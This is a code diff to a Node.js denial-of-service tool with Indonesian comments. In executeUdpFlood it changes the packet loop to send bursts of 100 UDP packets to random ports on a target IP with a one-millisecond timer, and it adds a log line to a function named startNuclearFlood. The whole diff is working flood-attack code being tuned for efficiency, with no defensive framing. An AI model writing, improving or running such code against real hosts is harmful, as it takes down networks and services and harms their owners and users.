@@ -72,15 +72,18 @@ function executeUdpFlood(targetIp, durationSeconds) {
             return;
         }
         
-        // Kirim ke port acak
-        client.send(payload, Math.floor(Math.random() * 65535) + 1, targetIp, (err) => {
-            if (!err) {
-                localSent++;
-            }
-        });
+        // Kirim burst kecil (misal: 100 paket) untuk efisiensi dan mengurangi overhead timer
+        for (let i = 0; i < 100; i++) {
+            // Kirim ke port acak
+            client.send(payload, Math.floor(Math.random() * 65535) + 1, targetIp, (err) => {
+                if (!err) {
+                    localSent++;
+                }
+            });
+        }
         
-        // Loop secepat mungkin
-        setTimeout(attack, 0); // Ganti setImmediate untuk mencegah event loop blocking
+        // Loop dengan delay kecil untuk memberi nafas pada event loop, mencegah saturasi.
+        setTimeout(attack, 1);
     };
 
     // Kirim statistik secara berkala
@@ -256,6 +259,7 @@ function startNuclearFlood(targetUrl, durationSeconds, statusCallback) { // This
             }
         };
 
+        console.log("Master: Mengembalikan kontrol 'stop' ke pemanggil.");
         return { stop: stopAttack };
     }
 }
